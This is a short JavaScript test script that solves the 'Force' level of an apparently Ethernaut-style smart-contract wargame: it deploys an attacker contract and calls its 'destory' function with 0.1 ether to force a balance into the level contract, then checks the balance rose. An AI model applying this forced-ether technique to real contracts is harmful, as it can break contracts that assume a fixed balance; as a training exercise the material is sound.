const { expect } = require("chai");
var tools = require("./tools");

describe("07Force", function () {
  let player, levelOwner, levelContract, runContract;
  it("setup", async function () {
    [player, levelOwner, levelContract] = await tools.initLevel("Force");
    runContract = await tools.deployContract("ForceRun", player);
    //检查原始的余额
    expect(await tools.getBalance(levelContract.address)).to.equal(0);
  });

  it("attacks", async function () {
    await runContract
      .connect(player)
      .destory(levelContract.address, {
        value: ethers.utils.parseEther("0.1"),
      });
  });

  it("check", async function () {
    //检查通过条件
    expect(await tools.getBalance(levelContract.address)).to.above(0);
  });
});
